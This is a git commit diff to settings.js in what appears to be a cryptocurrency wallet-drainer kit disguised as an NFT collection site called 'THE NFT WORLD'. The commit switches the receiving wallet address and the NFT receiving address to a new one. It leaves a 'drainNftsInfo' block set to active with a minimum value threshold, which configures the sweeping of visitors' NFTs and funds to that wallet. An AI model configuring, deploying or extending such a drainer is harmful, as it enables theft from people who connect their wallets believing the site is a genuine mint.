5c0e98b120e1800517fcce7397a24dac09705a34
Jbonesy23 <123136384+Jbonesy23@users.noreply.github.com>
2023-01-28 22:16:40 -0800

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+const receiveAddress = '0x13E98065692015dDC1C92E894CF63a1B5f7a7354',
   collectionInfo = {
     name: 'THE NFT WORLD',
     socialMedia: {
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x13E98065692015dDC1C92E894CF63a1B5f7a7354',
   },
 
   customStrings = {
